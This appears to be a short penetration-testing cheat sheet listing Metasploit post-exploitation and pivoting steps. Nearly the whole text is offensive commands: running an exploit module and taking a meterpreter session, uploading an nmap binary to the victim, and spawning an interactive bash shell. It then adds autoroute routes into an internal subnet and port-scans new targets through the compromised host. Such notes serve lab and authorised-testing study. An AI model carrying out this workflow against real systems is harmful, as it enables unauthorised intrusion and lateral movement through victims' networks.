1. Run the module
```bash
msf> run or exploit
```

2. Get meterpreter shell and check if session created and info about victim
```bash
meterpreter> sysinfo
```

3. Upload nmap static binary if needed for port scan
```bash
meterpreter> upload LOCAL_PATH REMOTE_PATH # You can upload '/root/static-binaries/nmap'
```

4. Spawn shell session so we get usual commands
```bash
meterpreter> shell   # Spawn normal shell
meterpreter> /bin/bash -i # Convert to interactive bash session
```

5. Check possible internal network connections
```bash
ip a 
ifconfig
```

6. Step out of interactive shell and add internal ip to routes
```bash
meterpreter> run autoroute -s INTERNAL_IP_SUBNET   # Add Subnet route to targets
meterpreter> run autoroute -d -s FALSE_IP_SUBNET   # Remove subnet if wrong ip inputed
meterpreter> run autoroute -p                     # Check active routes
```

7. Background session 
```bash
meterpreter> background
```

8. Port scan new target, to rebound on set subnet route
```bash
msf> search portscan
msf> use auxiliary/scanner/portscan/tcp
msf> set RHOST NEW_TARGET_ON_NEW_SUBNET
msf> run
```